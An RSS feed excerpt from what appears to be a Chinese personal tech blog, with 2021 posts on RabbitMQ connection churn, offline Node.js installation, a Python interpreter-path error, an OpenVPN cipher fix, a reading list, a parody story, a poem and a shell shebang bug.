&lt;li&gt;&lt;a href=&#34;https://designyoutrust.com/2021/04/person-uses-artificial-intelligence-to-make-anime-and-cartoon-characters-look-more-realistic/&#34;&gt;https://designyoutrust.com/2021/04/person-uses-artificial-intelligence-to-make-anime-and-cartoon-characters-look-more-realistic/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>RabbitMq 大量的连接抖动</title>
      <link>https://wdd.js.org/posts/2021/05/nr1shd/</link>
      <pubDate>Thu, 13 May 2021 11:41:43 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/05/nr1shd/</guid>
      <description>&lt;h1 id=&#34;连接抖动介绍&#34;&gt;连接抖动介绍&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Workloads with high connection churn (a high rate of connections being opened and closed) will require TCP setting tuning to avoid exhaustion of certain resources: max number of file handles, Erlang processes on RabbitMQ nodes, kernel&amp;rsquo;s ephemeral port range (for hosts that open a lot of connections, including Federation links and Shovel connections), and others. &lt;strong&gt;Nodes that are exhausted of those resources won&amp;rsquo;t be able to accept new connections&lt;/strong&gt;, which will negatively affect overall system availability.&lt;/p&gt;</description>
    </item>
    <item>
      <title>离线安装nodejs</title>
      <link>https://wdd.js.org/fe/install-nodejs-offline/</link>
      <pubDate>Thu, 13 May 2021 09:43:00 +0800</pubDate>
      <guid>https://wdd.js.org/fe/install-nodejs-offline/</guid>
      <description>&lt;h1 id=&#34;1-选择安装包&#34;&gt;1. 选择安装包&lt;/h1&gt;
&lt;p&gt;访问 &lt;a href=&#34;https://nodejs.org/en/download/&#34;&gt;https://nodejs.org/en/download/&lt;/a&gt;
选择Linux Binaries(x64)
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/install-nodejs-offline/2022-10-29-10-38-33.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-解压&#34;&gt;2. 解压&lt;/h1&gt;
&lt;p&gt;下载后的文件是一个tar.xz的文件。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;xz -d node-xxxx.tar.zx  // 解压xz
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tar -xvf node-xxxx.tar  // 拿出文件夹
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;解压后的目录如下，其中&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  node-v14.17.0-linux-x64 ll
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;total 600K
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; wangdd staff 4.0K May &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; 09:34 bin
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; wangdd staff 469K May &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; 02:14 CHANGELOG.md
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; wangdd staff 4.0K May &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; 09:34 include
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; wangdd staff 4.0K May &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; 09:34 lib
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; wangdd staff  79K May &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; 02:14 LICENSE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r-- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; wangdd staff  30K May &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; 02:14 README.md
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; wangdd staff 4.0K May &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; 02:14 share
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;// bin目录下就是nodejs的可执行程序
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  node-v14.17.0-linux-x64 ll bin
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;total 71M
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rwxr-xr-x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; wangdd staff 71M May &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; 02:14 node
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; wangdd staff  &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt; May &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; 02:14 npm -&amp;gt; ../lib/node_modules/npm/bin/npm-cli.js
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; wangdd staff  &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt; May &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; 02:14 npx -&amp;gt; ../lib/node_modules/npm/bin/npx-cli.js
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  node-v14.17.0-linux-x64 ./bin/node --version
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;v14.17.0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;通过将bin目录加入到$PATH环境变量中这种方式，就可以直接调用node。&lt;/p&gt;</description>
    </item>
    <item>
      <title>用古龙的手法 写我只会心疼哥哥</title>
      <link>https://wdd.js.org/posts/2021/05/rhan2i/</link>
      <pubDate>Mon, 10 May 2021 20:38:50 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/05/rhan2i/</guid>
      <description>&lt;p&gt;【我只会心疼哥哥（原视频）-哔哩哔哩】&lt;a href=&#34;https://b23.tv/9YIMtp&#34;&gt;https://b23.tv/9YIMtp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;蓝天白云，晴空万里。路旁的电线杆笔挺的站着，有几只小鸟，在电线上蹦来蹦去，叫着闹着，空气中充了令人愉快的感觉。&lt;/p&gt;
&lt;p&gt;一辆白色雅迪冠能T5石墨烯72电池增程矩阵式大灯轻便型电动车自北向南，疾驰而过。&lt;/p&gt;
&lt;p&gt;车上坐着一男一女。少女扎着马尾辫，手中举着一根折叠式棒棒糖，笑靥如画，喃喃道：“哥哥，哥哥，你给我买这个，你女朋友知道了，不会生气吧？” 不等男生回答，她自顾自的先尝了一口。然后把棒棒糖举到男生嘴边，然后嘻嘻笑道：“真好吃，哥，你也尝一口”&lt;/p&gt;
&lt;p&gt;没有一个人瞧见这男生是怎么舔到棒棒糖的，但他的确尝了一口。&lt;/p&gt;
&lt;p&gt;少女睁大眼睛，张开嘴巴，惊讶的瞪着棒棒糖，又生气又害羞，仿佛怪自己不该那么鲁莽。她皎白的面颊已泛起了晕晕，在阳光下，放佛是一朵刚开的海棠， 娇嗔道：“哥哥，你女朋友要是知道我俩吃同一个棒棒糖，你女朋友不会吃醋吧？”&lt;/p&gt;
&lt;p&gt;“哥哥，你骑着小电动车，还带着我，你女朋友要是知道了，不会打我吧”&lt;/p&gt;
&lt;p&gt;“好可怕！你女朋友！”&lt;/p&gt;
&lt;p&gt;少女用眼角瞟着男生，黯然道：“你女朋过不像我，我只会心疼哥哥。”&lt;/p&gt;</description>
    </item>
    <item>
      <title>python ModuleNotFoundError</title>
      <link>https://wdd.js.org/posts/2021/05/blzt8r/</link>
      <pubDate>Mon, 10 May 2021 11:01:26 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/05/blzt8r/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 wave.py
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Traceback &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;most recent call last&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wave.py&amp;#34;&lt;/span&gt;, line 3, in &amp;lt;module&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    import matplotlib.pyplot as plt
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ModuleNotFoundError: No module named &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;matplotlib&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这种问题一般有两个原因&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;这个第三方的包本地的确没有安装，解决方式就是安装这个包&lt;/li&gt;
&lt;li&gt;这个包安装了，但是因为环境配置或者其他问题，导致找不到正确的路径&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;问题1-本地有没有安装过matplotlib&#34;&gt;问题1: 本地有没有安装过matplotlib?&lt;/h1&gt;
&lt;p&gt;下面的命令的输出说明已经安装了matplotlib, 并且目录是&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/usr/local/lib/python3.9/site-packages&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip3 show matplotlib
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Name: matplotlib
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Version: 3.4.1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Summary: Python plotting package
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Home-page: https://matplotlib.org
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Author: John D. Hunter, Michael Droettboom
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Author-email: matplotlib-users@python.org
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;License: PSF
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Location: /usr/local/lib/python3.9/site-packages
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Requires: pillow, python-dateutil, pyparsing, numpy, kiwisolver, cycler
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Required-by:
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;问题2-python3运行的那个版本的python&#34;&gt;问题2: python3运行的那个版本的python？&lt;/h1&gt;
&lt;p&gt;由于历史原因，python的版本非常多，电脑上可能安装了多个python的版本。&lt;/p&gt;
&lt;p&gt;下面的命令说明，python3实际执行的的是python 3.8.2，搜索的路径也是3.8的。但是pip3安装的第三方包，是在python3.9的目录下。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  bin python3
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Python 3.8.2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default, Dec &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; 2020, 15:06:04&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Clang 12.0.0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;clang-1200.0.32.29&lt;span style=&#34;color:#f92672&#34;&gt;)]&lt;/span&gt; on darwin
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Type &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;copyright&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;credits&amp;#34;&lt;/span&gt; or &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;license&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; more information.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;&amp;gt;&amp;gt; import sys
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;&amp;gt;&amp;gt; print&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;sys.path&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python38.zip&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/lib-dynload&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.8/lib/python3.8/site-packages&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;➜  pip3 -V
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip 21.0.1 from /usr/local/lib/python3.9/site-packages/pip &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;python 3.9&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;问题3-python39在哪&#34;&gt;问题3: python3.9在哪？&lt;/h1&gt;
&lt;p&gt;通过上面的命令，就说了我的电脑上有python3.9， 那么实际要克制行文件在哪里呢？&lt;/p&gt;</description>
    </item>
    <item>
      <title>5月书单</title>
      <link>https://wdd.js.org/posts/2021/05/appxev/</link>
      <pubDate>Mon, 10 May 2021 08:51:30 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/05/appxev/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;人生是一场仅与时间为伴的孤独修行&lt;/p&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;A《鲁宾逊漂流记》&lt;/li&gt;
&lt;li&gt;B《一日看尽长安花》&lt;/li&gt;
&lt;li&gt;C《被讨厌的勇气》&lt;/li&gt;
&lt;li&gt;D《围城》&lt;/li&gt;
&lt;li&gt;E《牛津通识读本 数学》&lt;/li&gt;
&lt;/ul&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;/th&gt;
          &lt;th&gt;5.10&lt;/th&gt;
          &lt;th&gt;11&lt;/th&gt;
          &lt;th&gt;12&lt;/th&gt;
          &lt;th&gt;13&lt;/th&gt;
          &lt;th&gt;14&lt;/th&gt;
          &lt;th&gt;15&lt;/th&gt;
          &lt;th&gt;16&lt;/th&gt;
          &lt;th&gt;17&lt;/th&gt;
          &lt;th&gt;18&lt;/th&gt;
          &lt;th&gt;19&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;鲁滨逊漂流记&lt;/td&gt;
          &lt;td&gt;3&lt;/td&gt;
          &lt;td&gt;6&lt;/td&gt;
          &lt;td&gt;9&lt;/td&gt;
          &lt;td&gt;20&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;被讨厌的勇气&lt;/td&gt;
          &lt;td&gt;20&lt;/td&gt;
          &lt;td&gt;25&lt;/td&gt;
          &lt;td&gt;30&lt;/td&gt;
          &lt;td&gt;36&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;围城&lt;/td&gt;
          &lt;td&gt;6&lt;/td&gt;
          &lt;td&gt;10&lt;/td&gt;
          &lt;td&gt;11&lt;/td&gt;
          &lt;td&gt;13&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;牛津通识读本 数学&lt;/td&gt;
          &lt;td&gt;5&lt;/td&gt;
          &lt;td&gt;8&lt;/td&gt;
          &lt;td&gt;10&lt;/td&gt;
          &lt;td&gt;19&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;一日看尽长安花&lt;/td&gt;
          &lt;td&gt;15&lt;/td&gt;
          &lt;td&gt;20&lt;/td&gt;
          &lt;td&gt;24&lt;/td&gt;
          &lt;td&gt;35&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;</description>
    </item>
    <item>
      <title>openvpn 报错</title>
      <link>https://wdd.js.org/posts/2021/05/kakgg7/</link>
      <pubDate>Sat, 01 May 2021 13:58:18 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/05/kakgg7/</guid>
      <description>&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;2021-01-19 12:01:58 OPTIONS ERROR: failed to negotiate cipher with server.  Add the server&amp;#39;s cipher (&amp;#39;BF-CBC&amp;#39;) to --data-ciphers (currently &amp;#39;AES-256-GCM:AES-128-GCM&amp;#39;) if you want to connect to this server.
2021-01-19 12:01:58 ERROR: Failed to apply push options
2021-01-19 12:01:58 Failed to open tun/tap interface
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解决办法：&lt;!-- raw HTML omitted --&gt;在配置文件中增加一行&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ncp-ciphers &amp;#34;BF-CBC&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;PS： 今天是我的生日，QQ邮箱又是第一个发来祝福的 苦笑.jpg&lt;/p&gt;&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>不曾忘的一首小诗</title>
      <link>https://wdd.js.org/posts/2021/04/gbx6x5/</link>
      <pubDate>Wed, 28 Apr 2021 21:52:33 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/04/gbx6x5/</guid>
      <description>&lt;p&gt;我小时候曾去过成都，那时候还没有高速公路，而是九曲回肠的盘山公路。路的一边是看不到底悬崖，另一边上接近90度的峭壁。在峭壁之上，有很多巨石，摇摇欲坠，十分吓人。&lt;/p&gt;
&lt;p&gt;深夜时分，车灯蔓延处，连起来放佛是一条天路。&lt;/p&gt;
&lt;p&gt;从成都回来的时候，我写下这个小诗，匆匆十年，桃花依旧，物是人非。曾经梦想中的的那个遥远的未来，已然近在咫尺。然而这首小诗，却从未忘记。&lt;/p&gt;
&lt;p&gt;灯光随血液而流动&lt;!-- raw HTML omitted --&gt;心跳伴坎坷而起伏&lt;!-- raw HTML omitted --&gt;极目远眺&lt;!-- raw HTML omitted --&gt;想看见路的时候&lt;!-- raw HTML omitted --&gt;蓦然回首&lt;!-- raw HTML omitted --&gt;路的尽头&lt;!-- raw HTML omitted --&gt;心里头&lt;/p&gt;</description>
    </item>
    <item>
      <title>从/bin/sh到费曼学习法</title>
      <link>https://wdd.js.org/posts/2021/04/zl6rpy/</link>
      <pubDate>Wed, 28 Apr 2021 15:08:19 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/04/zl6rpy/</guid>
      <description>&lt;p&gt;今天在写一个shell脚本的时候，遇到一个奇怪的报错，说我的脚本有语法错误。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $1 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; $2 &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo ok
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	echo not ok
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;编译器的报错是说if语句是有问题的，但是我核对了好久遍，也看了网上的例子，发现没什么毛病。&lt;/p&gt;
&lt;p&gt;我自己看了几分钟，还是看不出所以然来。然后我就找了一位同事帮我看看，首先我给他解释了一遍我的脚本是如何工作的，说着说着，他还在思考的时候。我突然发现，我知道原因了。&lt;/p&gt;
&lt;p&gt;这个shell脚本是我从另一个脚本里拷贝的。脚本的第一行是&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;原因就在与第一行的这条语句。&lt;/p&gt;
&lt;p&gt;一般情况下我们都是写得/bin/bash,  但是在拷贝的时候，我没有考虑到这个。实际在我的电脑上/bin/sh很可能不是bash, 而是zsh，zsh的语法和bash的语法是不一样的。所以会抱语法错误&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这就是典型的一叶障目，不见泰山。 我觉得我需要买个小黄鸭，在遇到的难以解决的问题时，抽丝剥茧的解释给它听。&lt;/p&gt;
&lt;p&gt;经过这件事情后，我也想到了今天刚学到的一个概念。叫做费曼学习法，据说是很牛逼的学习法，可以非常快的学习一门知识。&lt;/p&gt;
&lt;p&gt;简单介绍一下费曼学习法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;选择一个你要学学习的概念，写在本子上&lt;/li&gt;
&lt;li&gt;假装你要把这个概念教会别人&lt;/li&gt;
&lt;li&gt;你一定会某些地方卡壳的，当你卡壳的时候，就立即回去看书&lt;/li&gt;
&lt;li&gt;简化你的语言，目的是用你自己的语言，解释某个概念，如果你依然还是有些困惑，那说明你还是不够了解这个概念。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;费曼曾获得诺贝尔奖，所以上他不是个简单的人。费曼的老师叫惠勒，费曼的学习方法很可能收到惠勒的影响。&lt;/p&gt;
&lt;p&gt;惠勒常常说：人只有教别人的时候，才能学到更多。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Another favorite Wheelerism is &amp;ldquo;one can only learn by teaching. 惠勒主义&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;惠勒还有一句名言：&lt;/p&gt;
&lt;p&gt;去恨就是是学习，去学习是去理解，去理解是去欣赏，去欣赏则是去爱，也许你会爱上你的理论。，&lt;/p&gt;
